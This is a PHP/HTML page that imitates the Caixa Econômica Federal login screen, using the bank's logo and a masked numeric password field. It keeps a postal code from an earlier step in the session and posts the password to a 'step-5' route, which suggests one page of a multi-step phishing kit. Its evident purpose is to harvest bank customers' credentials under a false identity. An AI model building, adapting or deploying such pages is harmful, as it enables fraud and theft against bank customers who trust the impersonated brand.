<?php
//SENHA
 session_start();

 if(isset($_POST['cep'])){
    $_SESSION['cep'] = $_POST['cep']; 
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Caixa Economica</title>

    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />

    <link rel="stylesheet" href="<?=PATH?>css/default.css">
</head>
<body>
    <main class="bg">
        <div class="box">
            <div class="header-box">
                <div class="title-box">
                    <img src="<?=PATH?>images/logo_caixa.png" height="30px;" alt="">
                    <p>Login Caixa</p>
                </div>
            </div> 
            <br>
            <div class="content-box">
                <p>Informe sua Senha:</p>
                <br>
                <p style="font-size: 0.8rem;"><i class="fa-solid fa-key"></i> Senha</p>
                <form action="<?=PATH?>step-5" method="POST">
                    <div>
                        <input class="senha" name="senha" type="password" autocomplete="off" required>
                    </div>
                    <br>
                    <input class="btn-submit" type="submit" value="Entrar">
                </form>
            </div>
            <div class="footer-box">
                <p><span><i class="fa-solid fa-question"></i></span><u>Preciso de ajuda</u></p>
            </div>
        </div>
    </main>

<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
<script src="<?=PATH?>js/jquery.mask.js"></script>

<script>
    $(document).ready(function(){
        $('.phone_with_ddd').mask('(00) 0000-0000');
        $('.cep').mask('00000-000');
        $('.cpf').mask('000.000.000-00', {reverse: true});
        $('.date').mask('00/00/0000');
        $('.senha').mask('00000000');

    })
</script>
</body>
</html>